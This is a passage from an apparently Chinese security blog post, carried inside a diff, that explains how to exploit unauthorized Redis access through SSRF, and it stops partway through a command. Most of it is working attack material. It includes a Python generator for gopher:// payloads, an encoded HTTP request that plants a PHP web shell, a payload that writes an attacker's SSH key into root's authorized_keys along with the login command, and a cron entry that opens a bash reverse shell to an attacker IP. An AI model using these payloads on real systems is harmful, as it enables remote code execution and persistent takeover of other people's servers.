+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;config set dir &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;config set dbfilename &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">filename&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;save&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="n">passwd&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;AUTH &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">passwd&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">protocol&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">port&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;/_&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">redis_format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">CRLF&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">redis_arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">arr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;*&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">redis_arr&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">redis_arr&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="n">CRLF&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;$&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{IFS}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">))))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">CRLF&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{IFS}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="n">CRLF&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">cmd&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">urllib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">quote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">redis_format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print(payload)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">urllib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">quote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 执行后即可得到如下payload，构造如下数据包：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/SSRF.php?url=gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252433%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">61.139.2.132&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">User-Agent&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Encoding&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">gzip, deflate&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept-Language&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Accept&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Pragma&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">no-cache&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Cache-Control&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">no-cache&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Upgrade-Insecure-Requests&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">1&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 来到Web服务的目录下的即可看到shell已写好。&lt;/p>
+&lt;p>&lt;img src="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250206133410370.png"
+width="303"
+height="156"
+srcset="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250206133410370_hu9250684864358760285.png 480w, https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250206133410370_hu10425876102580602205.png 1024w"
+loading="lazy"
+alt="image-20250206133410370"
+class="gallery-image"
+data-flex-grow="194"
+data-flex-basis="466px"
+>&lt;/p>
+&lt;h3 id="redis写入ssh公钥">Redis写入ssh公钥
+&lt;/h3>&lt;p>​ 利用条件：Redis拥有root权限。&lt;/p>
+&lt;p>​ 原理：通过在目标机器上写入ssh公钥，然后攻击机便可通过ssh免密码登录。&lt;/p>
+&lt;p>​ 先在攻击机中生成ssh公/私钥。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh-keygen -t rsa
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 一直回车即可。完成后，即可查看/root/.ssh下的公私钥。查看id_rsa.pub，复制后利用如下脚本。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">urllib&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">urllib.parse&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">protocol&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;gopher://&amp;#34;&lt;/span> &lt;span class="c1"># 使用的协议 &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ip&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;127.0.0.1&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">port&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;6379&amp;#34;&lt;/span> &lt;span class="c1"># 目标redis的端口号 &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">shell&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s2">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0TTQ+pRMCoRIoX4Fa2qRhIG4qd0/50Y5e69emOhKFlOVHWXuOnKvTv9Due+g0XN2sPNLTap0Ga9Ix3hPYWsYdwrw7i9afDGkGxs+bf0TshnCvSZFcPP0PCZBul4LWW4wHeQGgOD7hXA695UQVZzS/8i1czIOnuCoXqTzRTQOSvSRNzNEBuChBMYqOsLK9y+9HTwz1GrhA8Iki2+94OUm5vT7z4V44bdWXuNP11ECphpaFEc2ZIpkaQ2fuT17b2HM1XFz/oJv8K3oz6zYf6PX1BV7n/tTMJKKNdRw2cjWiYCO3eun2FRAe9kpnpqD7J4eV9C6OMfjCylGqMW1ksHO4OSuDfpr0+GPecXFQw/sOwQdTLdqQWKl3sHeWVZK5ju9AeGhTGbk/H4fNwKtTRqEf7v6V+hCU7iPGG/00arjjQ63pfDJ8t54WD4pXHknAqPgIbaQAo9PqwfY9IaZ+KOyKXCGjzvqFsDzkdqDBHeeQMaO06O1YIDoqtHzTlMlUuX0= root@player-virtual-machine&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">filename&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;authorized_keys&amp;#34;&lt;/span> &lt;span class="c1"># shell的名字 &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">path&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;/root/.ssh/&amp;#34;&lt;/span> &lt;span class="c1"># 写入的路径&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">passwd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span> &lt;span class="c1"># 如果有密码 则填入&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 我们的恶意命令 &lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cmd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;flushall&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;set 1 &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">shell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{IFS}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;config set dir &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;config set dbfilename &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">filename&lt;/span>&lt;span class="p">),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;save&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="n">passwd&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">insert&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34;AUTH &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">passwd&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">protocol&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">port&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;/_&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">redis_format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">arr&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">CRLF&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\r\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">redis_arr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">arr&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;*&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">redis_arr&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">redis_arr&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="n">CRLF&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s2">&amp;#34;$&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{IFS}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">))))&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">CRLF&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{IFS}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cmd&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="n">CRLF&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">cmd&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">cmd&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">payload&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="n">urllib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">quote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">redis_format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">#print(payload)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">urllib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">quote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ 利用生成的payload，在目标机的/root/.ssh目录下写入一个authorized_keys文件，然后使用如下命令连接。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ssh -i /root/.ssh/id_rsa root@IP
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>​ &lt;img src="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250208135632966.png"
+width="705"
+height="69"
+srcset="https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250208135632966_hu17303982200245859268.png 480w, https://hadagaga.github.io/p/ssrf-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/image-20250208135632966_hu3393692614676829730.png 1024w"
+loading="lazy"
+alt="image-20250208135632966"
+class="gallery-image"
+data-flex-grow="1021"
+data-flex-basis="2452px"
+>&lt;/p>
+&lt;h3 id="定时任务反弹shell">定时任务反弹shell
+&lt;/h3>&lt;p>​ 条件：&lt;/p>
+&lt;ol>
+&lt;li>redis 有 root&lt;/li>
+&lt;li>Centos由于Redis 输出的文件都是 644 权限，但是 ubuntu 中的定时任务一定要600权限才能实现所以这个方法只适用于Centos&lt;/li>
+&lt;/ol>
+&lt;p>​ 未授权访问写入：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">flushall
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> &lt;span class="m">1&lt;/span> &lt;span class="s2">&amp;#34;\n\n\n\n* * * * * root bash -i &amp;gt;&amp;amp; /dev/tcp/{IP}/port 0&amp;gt;&amp;amp;1\n\n\n\n&amp;#34;&lt;/span>
